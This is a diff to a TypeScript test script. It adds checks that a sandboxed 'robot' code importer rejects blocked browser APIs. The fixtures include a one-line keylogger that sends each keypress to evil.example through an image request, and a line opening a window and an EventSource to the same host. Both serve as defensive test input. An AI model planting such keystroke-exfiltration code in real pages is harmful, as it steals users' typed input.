@@ -212,6 +212,22 @@ async function main(): Promise<void> {
                 ctorResult.ok ? 'unexpected ok' : ctorResult.error,
             );
 
+            const keylogger = "addEventListener('keydown', e => { new Image().src = 'https://evil.example/?k=' + e.key; });";
+            const keyloggerResult = await importRobotFromText(keylogger);
+            check(
+                'keylogger fixture (addEventListener + Image) is blocked',
+                !keyloggerResult.ok && keyloggerResult.error.startsWith('blocked API:'),
+                keyloggerResult.ok ? 'unexpected ok' : keyloggerResult.error,
+            );
+
+            const openEventSource = "open('https://evil.example/x'); const s = new EventSource('https://evil.example/stream');";
+            const openEventSourceResult = await importRobotFromText(openEventSource);
+            check(
+                'open()/EventSource fixture is blocked',
+                !openEventSourceResult.ok && openEventSourceResult.error.startsWith('blocked API:'),
+                openEventSourceResult.ok ? 'unexpected ok' : openEventSourceResult.error,
+            );
+
             for (const banned of ['self', 'top', 'parent', 'frames']) {
                 const hostResult = await importRobotFromText(`const x = ${banned};`);
                 check(
